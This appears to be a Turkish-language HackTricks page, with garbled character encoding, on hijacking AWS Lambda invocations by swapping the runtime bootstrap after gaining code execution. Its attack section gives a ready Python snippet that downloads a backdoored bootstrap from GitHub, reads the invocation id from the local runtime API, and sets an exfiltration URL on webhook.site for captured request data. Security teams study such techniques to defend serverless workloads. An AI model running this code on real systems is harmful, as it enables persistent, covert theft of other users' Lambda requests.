# AWS - Lambda Ä°steklerini Ã‡alma

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Lambda AkÄ±ÅŸÄ±

<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer**, **invokasyonlarÄ±** **init** iÅŸlemine **gÃ¶nderen** bir konteyner dÄ±ÅŸÄ± iÅŸlemdir.
2. Init iÅŸlemi, ilginÃ§ uÃ§ noktalarÄ± aÃ§Ä±ÄŸa Ã§Ä±karan **9001** numaralÄ± baÄŸlantÄ± noktasÄ±nÄ± dinler:
* **`/2018-06-01/runtime/invocation/next`** â€“ bir sonraki invokasyon etkinliÄŸini al
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** â€“ invokasyon iÃ§in iÅŸleyici yanÄ±tÄ±nÄ± dÃ¶ndÃ¼r
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** â€“ bir yÃ¼rÃ¼tme hatasÄ± dÃ¶ndÃ¼r
3. **bootstrap.py**, init iÅŸleminden invokasyonlarÄ± alan ve bunlarÄ± iÅŸlemek iÃ§in kullanÄ±cÄ± kodunu Ã§aÄŸÄ±ran bir dÃ¶ngÃ¼ye sahiptir (**`/next`**).
4. Son olarak, **bootstrap.py**, **yanÄ±tÄ±** init'e gÃ¶nderir

Bootstrap'un kullanÄ±cÄ± kodunu bir modÃ¼l olarak yÃ¼klediÄŸini unutmayÄ±n, bu nedenle kullanÄ±cÄ± kodu tarafÄ±ndan gerÃ§ekleÅŸtirilen herhangi bir kod yÃ¼rÃ¼tme aslÄ±nda bu iÅŸlemde gerÃ§ekleÅŸmektedir.

## Lambda Ä°steklerini Ã‡alma

Bu saldÄ±rÄ±nÄ±n amacÄ±, kullanÄ±cÄ± kodunu, zayÄ±f isteÄŸi iÅŸleyen **`bootstrap.py`** iÅŸlemi iÃ§inde kÃ¶tÃ¼ niyetli bir **`bootstrap.py`** iÅŸlemi yÃ¼rÃ¼tmeye zorlamaktÄ±r. Bu ÅŸekilde, **kÃ¶tÃ¼ niyetli bootstrap** iÅŸlemi, istekleri iÅŸlemek iÃ§in **init iÅŸlemiyle konuÅŸmaya baÅŸlayacak** ve **meÅŸru** bootstrap, kÃ¶tÃ¼ niyetli olanÄ± Ã§alÄ±ÅŸtÄ±rÄ±rken **tuzakta** kalacak, bu nedenle init iÅŸleminden istekler istemeyecektir.&#x20;

Bu, kullanÄ±cÄ± kodunun meÅŸru **`bootstrap.py`** iÅŸlemi tarafÄ±ndan yÃ¼rÃ¼tÃ¼ldÃ¼ÄŸÃ¼ iÃ§in kolayca baÅŸarÄ±labilir bir gÃ¶revdir. Bu nedenle saldÄ±rgan:

* **Mevcut invokasyonun sahte sonucunu init iÅŸlemine gÃ¶nderir**, bÃ¶ylece init, bootstrap iÅŸleminin daha fazla invokasyon beklediÄŸini dÃ¼ÅŸÃ¼nÃ¼r.
* Bir istek, **`/${invoke-id}/response`**'a gÃ¶nderilmelidir.&#x20;
* invoke-id, meÅŸru **`bootstrap.py`** iÅŸleminin yÄ±ÄŸÄ±nÄ±ndan [**inspect**](https://docs.python.org/3/library/inspect.html) python modÃ¼lÃ¼nÃ¼ kullanarak (ÅŸurada Ã¶nerildiÄŸi gibi) (https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py) veya sadece tekrar **`/2018-06-01/runtime/invocation/next`**'e istek gÃ¶ndererek (ÅŸurada Ã¶nerildiÄŸi gibi) (https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py) alÄ±nabilir.
* Bir kÃ¶tÃ¼ niyetli **`boostrap.py`** yÃ¼rÃ¼tÃ¼n, bu iÅŸlem bir sonraki invokasyonlarÄ± iÅŸleyecektir
* Gizlilik amaÃ§larÄ±yla lambda invokasyon parametreleri bir saldÄ±rganÄ±n kontrol ettiÄŸi C2'ye gÃ¶nderilebilir ve ardÄ±ndan istekleri normal ÅŸekilde iÅŸleyebilir.
* Bu saldÄ±rÄ± iÃ§in, mevcut lambda invokasyonundan **`bootstrap.py`**'Ä±n orijinal kodunu almak yeterlidir ve kÃ¶tÃ¼ niyetli kodu ekleyip mevcut lambda invokasyonundan Ã§alÄ±ÅŸtÄ±rmaktÄ±r.

### SaldÄ±rÄ± AdÄ±mlarÄ±

1. Bir **Uzaktan Kod YÃ¼rÃ¼tme (RCE)** zafiyeti bulun.
2. Bir **kÃ¶tÃ¼ niyetli** **bootstrap** oluÅŸturun (Ã¶rneÄŸin [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py))
3. **KÃ¶tÃ¼ niyetli** bootstrap'u **yÃ¼rÃ¼tÃ¼n**.

Bu adÄ±mlarÄ± kolayca gerÃ§ekleÅŸtirebilirsiniz.
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Get invocation id
resp = http.request("GET", "127.0.0.1:9001/2018-06-01/runtime/invocation/next")
invoke_id = resp.headers["Lambda-Runtime-Aws-Request-Id"]

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
Daha fazla bilgi iÃ§in [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)

## Referanslar

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
